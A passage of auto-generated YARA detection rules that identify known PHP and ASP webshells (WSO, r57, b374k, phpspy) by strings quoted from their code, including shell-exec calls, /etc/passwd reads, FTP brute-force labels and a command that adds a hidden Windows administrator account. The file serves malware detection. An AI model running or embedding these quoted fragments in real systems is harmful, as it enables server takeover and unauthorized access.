      $s4 = "echo sr(15,\"\",\"<font face=Verdana size=-2>\".$lang[$language.'_text99'].\" ( <a href=\".$_SERVER['PHP_SELF'].\"?users>\".$lan" ascii
      $s5 = "echo sr(15,\"\",\"<font face=Verdana size=-2>\".$lang[$language.'_text99'].\" ( <a href=\".$_SERVER['PHP_SELF'].\"?users>\".$lan" ascii
      $s6 = "t color=red face=Verdana size=-2><div align=center><b>\".$lang[$language.'_text96'].\"</b></div></font></td></tr></table>\"; $_P" ascii
      $s7 = "T/GHC | <a href=http://rst.void.ru>http://rst.void.ru</a> | <a href=http://ghc.ru>http://ghc.ru</a> | version \".$version.\" ]--" ascii
      $s8 = "['cmd'] = \"\"; }" fullword ascii
      $s9 = "><div align=center><b>\".$text[$l][$n].\"</b></div></font></td></tr></table>\";" fullword ascii
      $s10 = "age.'_text95'].\"</a> )</font>\");" fullword ascii
      $s11 = "</b></font></div></td></tr></table>\".$f;" fullword ascii
      $s12 = "echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _phpshell3_pwhash_304 {
   meta:
      description = "webshell - from files phpshell3.php, pwhash.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "cbc57f72e7eb7466470260e0f41fba4210ff11041981f20fb45aa2662f1abcec"
      hash2 = "cfccc4dc2ee493e35cacab4aee80f2ec6386441afc309bd6e9ea5e481ab1a47a"
   strings:
      $s1 = "$password = isset($_POST['password']) ? $_POST['password'] : '';" fullword ascii
      $s2 = "$username = isset($_POST['username']) ? $_POST['username'] : '';" fullword ascii
      $s3 = "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"" fullword ascii
      $s4 = "  <link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">" fullword ascii
      $s5 = "   \"http://www.w3.org/TR/html4/strict.dtd\">" fullword ascii
      $s6 = "    $_POST = stripslashes_deep($_POST);" fullword ascii
      $s7 = "function stripslashes_deep($value) {" fullword ascii /* Goodware String - occured 1 times */
      $s8 = "</address>" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x3f3c and filesize < 40KB and ( all of them )
      ) or ( all of them )
}

rule _wso_4_2_4_v4xGus6X_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_1_wso2_WSO_4_0_5_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_ng_wso_305 {
   meta:
      description = "webshell - from files wso-4.2.4.php, v4xGus6X.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.1.php, wso2.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso-ng.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
      hash3 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash4 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash5 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash6 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash7 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash8 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash9 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash10 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash11 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash12 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash13 = "7dd2dad4b336d3d76a3a9f43aba0a119dc13a95fd1572c5c92d4996916848fb8"
      hash14 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = "$res = @ftp_login($fp, $login, $pass);" fullword ascii
      $s2 = "$temp = @file('/etc/passwd');" fullword ascii
      $s3 = "++$attempts;" fullword ascii
      $s4 = "@ftp_close($fp);" fullword ascii
      $s5 = "@system($in);" fullword ascii
      $s6 = "@passthru($in);" fullword ascii
      $s7 = "@pg_close($res);" fullword ascii
      $s8 = "$line = explode(\":\", $line);" fullword ascii
      $s9 = "$attempts = 0;" fullword ascii /* Goodware String - occured 1 times */
      $s10 = "$menu = '';" fullword ascii /* Goodware String - occured 2 times */
      $s11 = "$success = 0;" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _qyt0dHv1_1n73ction_306 {
   meta:
      description = "webshell - from files qyt0dHv1.php, 1n73ction.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9507cfcb16c1a7f91c2ec0b93393615e85fb7834c10c58c2f351f0c69bdee285"
      hash2 = "8dde4d18d837508fd3c62b2a4f8bf2ea9ddb4d11177331a28642518ffabfe8ed"
   strings:
      $s1 = "if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) " fullword ascii
      $s2 = "$result = curl_exec($curl);" fullword ascii
      $s3 = "    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); " fullword ascii
      $s4 = "        printLogin();" fullword ascii
      $s5 = "@error_reporting(0); " fullword ascii
      $s6 = "curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);" fullword ascii /* Goodware String - occured 1 times */
      $s7 = "curl_close($curl);" fullword ascii
      $s8 = "return sprintf('%1.2f',$s / 1024 ) .' KB';" fullword ascii
      $s9 = "return sprintf('%1.2f',$s / 1073741824 ).' GB';" fullword ascii
      $s10 = "return $s .' B';" fullword ascii
      $s11 = "return sprintf('%1.2f',$s / 1048576 ) .' MB';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso2_5_1_other_decode_wso_4_2_1_wso2_wso_4_1_3_wso_4_2_2_307 {
   meta:
      description = "webshell - from files wso2.5.1.php, other-decode.php, wso-4.2.1.php, wso2.php, wso-4.1.3.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash2 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash3 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash4 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash5 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash6 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $s1 = "show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stde" ascii
      $s2 = "echo \"</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 \".(@$_COOKIE[md5($_SERVER['HTTP_HOST']" ascii
      $s3 = "echo '<h1>Console</h1><div class=content><form name=cf onsubmit=\"if(d.cf.cmd.value==\\'clear\\'){d.cf.output.value=\\'\\';d.cf." ascii
      $s4 = "echo \"</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 \".(@$_COOKIE[md5($_SERVER['HTTP_HOST']" ascii
      $s5 = "lse{g(null,null,this.cmd.value,this.show_errors.checked?1:\\'\\');} return false;\"><select name=alias>';" fullword ascii
      $s6 = "ox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=" ascii
      $s7 = "rors.checked?1:\\'\\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\\'\\');}\" value=\">>\"> <nobr><input type" ascii
      $s8 = "':htmlspecialchars(@$_POST['p2'])).\"</textarea></form><pre class='ml1' style='\".(empty($_POST['p1'])?'display:none;':'').\"mar" ascii
      $s9 = "'ajax']?'checked':'').\"> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>\".(empty($_POST['p1'])" ascii
      $s10 = "-top:5px' id='strOutput'>\";" fullword ascii
      $s11 = "<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>\";" fullword ascii
      $s12 = "rr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style=\"border-bottom:0;margin:0;\" readonly>';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _phpspy_2006_lnc_308 {
   meta:
      description = "webshell - from files phpspy_2006.php, lnc.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash2 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
   strings:
      $s1 = ":</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td col" ascii
      $s2 = "header(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"_Files.tar.gz\");" fullword ascii
      $s3 = ":</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td col" ascii
      $s4 = "$filename = basename($_SERVER['HTTP_HOST'].\"_MySQL.sql\");" fullword ascii
      $s5 = "span=\"2\"><input type=\"radio\" name=\"backuptype\" value=\"download\"> " fullword ascii
      $s6 = "$tb->tdbody('<table width=\"100%\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" align=\"center\"><tr><td>'.$tb->makeinput('c" ascii
      $s7 = "$admin['check'] = \"1\";" fullword ascii
      $s8 = "','onclick=\"CheckAll(this.form)\"','checkbox','30','').' '.$tb->makeinput('downrar','" fullword ascii
      $s9 = "echo \"<INPUT type=checkbox value=1 name=dl[$filepath]>\";" fullword ascii
      $s10 = "','','submit').'</td><td align=\"right\">'.$dir_i.' " fullword ascii
      $s11 = "('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>" fullword ascii
      $s12 = "echo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">&lt;dir&gt;</td>\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _asp___1__asp__1___2014_10_23_14_54_16_asp__1__asp__1___as_309 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, asp (1)__2014-10-23-14-54-16.asp, asp (1).asp, asp (1).asp, .asp, asp.asp, asp (1)__2014-10-23-14-54-16.asp, vps.asp,  (1)__2014-10-23-14-54-16.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash4 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash5 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash6 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash7 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash8 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash9 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash10 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
      hash11 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "Session(\"FolderPath\")=RRePath(FolderPath)" fullword ascii
      $s2 = "Session(\"FolderPath\")=FolderPath" fullword ascii
      $s3 = "set session(\"c\")=c" fullword ascii
      $s4 = "F.SaveAs UName" fullword ascii
      $s5 = "IsObj=\" " fullword ascii
      $s6 = "If UName=\"\" Or F.FileSize=0 then" fullword ascii
      $s7 = "!\"\");return false;}if(str.length<10){alert(\"\"" fullword ascii
      $s8 = " (\"&D.DriveLetter&\":)</a></td></tr>\" " fullword ascii
      $s9 = "Set U=new UPC : Set F=U.UA(\"LocalFile\")" fullword ascii
      $s10 = "Sot(i,1)=IsObj" fullword ascii
      $s11 = "</a></td></tr>\"" fullword ascii
      $s12 = "SI=\"<br>" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_4_0__1__UnKnown_Vip__1__UnKnown_Vip__2012_310 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, 4.0 (1).asp, UnKnown Vip (1).asp, UnKnown Vip.asp, _2012.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash5 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash6 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash7 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
   strings:
      $s1 = "dnE.esnopseR" fullword ascii /* reversed goodware string 'Response.End' */
      $s2 = ">noitpo/<" fullword ascii /* reversed goodware string '</option>' */
      $s3 = "tcejbometsyselif.gnitpircs" fullword ascii
      $s4 = ">mrof/<" fullword ascii /* reversed goodware string '</form>' */
      $s5 = "1.0.0.721" fullword ascii /* reversed goodware string '127.0.0.1' */
      $s6 = "noitcA" fullword ascii /* reversed goodware string 'Action' */
      $s7 = "noitacilppA.llehS" fullword ascii
      $s8 = ">tsop=dohtem mrof<" fullword ascii
      $s9 = "(tseuqer&" fullword ascii
      $s10 = ">''=eulav noitpo<" fullword ascii
      $s11 = "(noisses neht " fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_4_0__1____2012____1__311 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, 4.0 (1).asp, .asp, _2012.asp, .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash5 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash6 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash7 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash8 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s2 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s3 = "If IsArray(PortArray) Then " fullword ascii
      $s4 = "j Port &\":\" " fullword ascii
      $s5 = "j hextointer(CStr(Hex(PortArray(1)))&CStr(Hex(PortArray(0))))" fullword ascii
      $s6 = "RadminHash" fullword ascii
      $s7 = "j\"Error! Can't Read!\"" fullword ascii
      $s8 = "j Parameter&\":\"" fullword ascii
      $s9 = " size='50'></td>\"" fullword ascii
      $s10 = "If  Len (hex(ParameterArray(i)))=1 Then " fullword ascii
      $s11 = "<input name='Sfk' style='width:200'>&nbsp;<input type='submit' value='" fullword ascii
      $s12 = "j strobj" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _DarkBlade1_5__indexx_312 {
   meta:
      description = "webshell - from files DarkBlade1.5.asp, .asp, indexx.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1acff7ac75d73a0c7589e0403e5e7be7b4708faf278f76eb45008710a7f9a4c8"
      hash2 = "0ba9d0d668d00ee68a2869c6a1b9c05f08469daa84f177079e76e4baeef7748c"
      hash3 = "a828153a8ec75ebeec010bd9e0fa5873b9c2602c0caa393a115075a16d74d0ab"
   strings:
      $s1 = "Server.ScriptTimeOut=5000" fullword ascii
      $s2 = "If InStr(Err.description,\"(Connect()).\")>0 Then" fullword ascii
      $s3 = "Do Until rs.EOF" fullword ascii
      $s4 = "If rs.Eof Then Exit For" fullword ascii
      $s5 = "For i=1 To rs.PageSize" fullword ascii
      $s6 = "rs.movefirst" fullword ascii
      $s7 = "If Not rs.Eof Then" fullword ascii
      $s8 = "str=CStr(str)" fullword ascii
      $s9 = "If rs.Fields.Count > 0 Then" fullword ascii
      $s10 = "Dim str" fullword ascii /* Goodware String - occured 3 times */
      $s11 = ".close" fullword ascii
      $s12 = "Select Case flag" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_8_source_b374k_2_4_b374k_2_5_source_b374k_2_6_source_b374k_3_2_2_b374k_2_3_b374k_3_2_3_b374k_2_7_source_313 {
   meta:
      description = "webshell - from files b374k-2.8.source.php, b374k-2.4.php, b374k-2.5.source.php, b374k-2.6.source.php, b374k-3.2.2.php, b374k-2.3.php, b374k-3.2.3.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c30f0ad13f188cb24481bc28512e8f71fd4188d6c6020cfe0c26f43a8233d91"
      hash2 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash3 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash4 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash5 = "72c6af6a4be99e31c4a7a0aa4f01750792788e7f6f9749243a9f2c47c14a708f"
      hash6 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
      hash7 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
      hash8 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
      $s2 = "1 => array(\"pipe\", \"w\")," fullword ascii
      $s3 = "function get_writabledir(){" fullword ascii
      $s4 = "header(\"Status: 404 Not Found\");" fullword ascii
      $s5 = "0 => array(\"pipe\", \"r\")," fullword ascii /* Goodware String - occured 1 times */
      $s6 = "// server misc info" fullword ascii
      $s7 = "// block search engine bot" fullword ascii
      $s8 = "// partition" fullword ascii
      $s9 = "// cpu info" fullword ascii
      $s10 = "// mem info" fullword ascii
      $s11 = "if(class_exists(\"ZipArchive\")){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_r57_kartal_r57_314 {
   meta:
      description = "webshell - from files r57shell127.php, r57_kartal.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash3 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $s1 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword ascii
      $s2 = "if(!empty($_POST['mysql_db'])) { @mysql_select_db($_POST['mysql_db'],$db); }" fullword ascii
      $s3 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_SERVER['PHP_AUTH_PW']!==$pass)" fullword ascii
      $s4 = "@pg_close($db);" fullword ascii
      $s5 = "@mssql_close($db);" fullword ascii
      $s6 = "@mysql_close($db);" fullword ascii
      $s7 = "       $sql  = \"<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;\".$keys.\"&nbsp;</b></font></td></tr>\";" fullword ascii
      $s8 = "        $keys = @implode(\"&nbsp;</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;\", @array_keys($row));" ascii
      $s9 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_r57shell_r57_Mohajer22_r57_315 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, r57shell.php, r57_Mohajer22.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash4 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash5 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $s1 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii
      $s2 = "'eng_text101'=>'Use reverse (user -> resu) login for password'," fullword ascii
      $s3 = "'eng_text96'=>'Can\\'t get users list'," fullword ascii
      $s4 = "'eng_text94'=>'FTP-bruteforce'," fullword ascii
      $s5 = "'eng_text88'=>'FTP-server:port'," fullword ascii
      $s6 = "'eng_text93'=>'FTP'," fullword ascii
      $s7 = "'eng_text98'=>'success: '," fullword ascii
      $s8 = "'eng_text91'=>'Archivation'," fullword ascii
      $s9 = "'eng_text92'=>'without archivation'," fullword ascii
      $s10 = "'eng_text97'=>'checked: '," fullword ascii
      $s11 = "'eng_text90'=>'Transfer mode'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_v4xGus6X_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_1_wso2_WSO_4_0_5_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_316 {
   meta:
      description = "webshell - from files wso-4.2.4.php, v4xGus6X.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.1.php, wso2.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
      hash3 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash4 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash5 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash6 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash7 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash8 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash9 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash10 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash11 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash12 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash13 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = "$fp = @ftp_connect($ip, $port?$port:21);" fullword ascii
      $s2 = "if( is_array($temp) )" fullword ascii
      $s3 = "for($i=strlen($line[0])-1; $i>=0; --$i)" fullword ascii
      $s4 = "echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp);" fullword ascii
      $s5 = "$tmp .= $line[0][$i];" fullword ascii
      $s6 = "if(!empty($path))" fullword ascii
      $s7 = "@mysql_close($res);" fullword ascii
      $s8 = "echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>';" fullword ascii
      $s9 = "while(!@feof($f))" fullword ascii
      $s10 = "if(!$fp) return false;" fullword ascii
      $s11 = "$tmp = \"\";" fullword ascii /* Goodware String - occured 4 times */
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso_4_2_3_wso_4_2_1_wso_4_2_5_wso_4_2_2_317 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso-4.2.3.php, wso-4.2.1.php, wso-4.2.5.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash3 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash4 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash5 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $x1 = " '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_unam" ascii
      $s2 = "()).'\" target=\"_blank\">[ Google ]</a> <a href=\"'.$explink.'\" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user." ascii
      $s3 = " '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_unam" ascii
      $s4 = "<input type='submit' value='fopo.com.ar' onclick=\\\"document.hf.action='http://fopo.com.ar/';document.hf.submit()\\\"><br>" fullword ascii
      $s5 = "n>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100" ascii
      $s6 = "{color:#fff !important;}" fullword ascii
      $s7 = "span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=" ascii
      $s8 = "red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick=\"g(\\'Php\\',null,null,\\'info\\')\">[ phpinfo ]</a" ascii
      $s9 = " '<table style=\"background-color:#2E6E9C;\" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';" fullword ascii
      $s10 = "OBALS['home_cwd'].'\\',\\'\\',\\'\\',\\'\\')\">[ home ]</a><br>'.$drives.'</td>'." fullword ascii
      $s11 = "/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick=\"g(\\'FilesMan\\',\\''" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

